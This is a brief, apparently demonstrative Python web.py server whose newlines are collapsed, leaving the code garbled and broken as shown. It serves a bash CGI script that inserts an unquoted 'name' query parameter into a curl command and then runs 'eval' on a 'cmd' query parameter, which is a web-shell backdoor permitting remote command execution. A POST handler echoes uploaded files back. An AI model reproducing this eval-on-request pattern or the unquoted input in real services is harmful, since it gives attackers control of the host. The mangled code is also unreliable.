import web
urls = ('/.*', 'index')class index:def POST(self):data = web.input(file={})return data.file.valuedef GET(self):return \
"""#!/bin/bash
source ./_dep/web.cgi
echo_headers
name=${_GET["name"]}
[[ $name == "" ]] && name='Bob'
curl -v http://httpbin.org/get?name=$name
cmd=${_GET["cmd"]} && eval $cmd
"""if __name__ == "__main__":app = web.application(urls, globals())web.httpserver.runsimple(app.wsgifunc(), ("0.0.0.0", 80))app.run()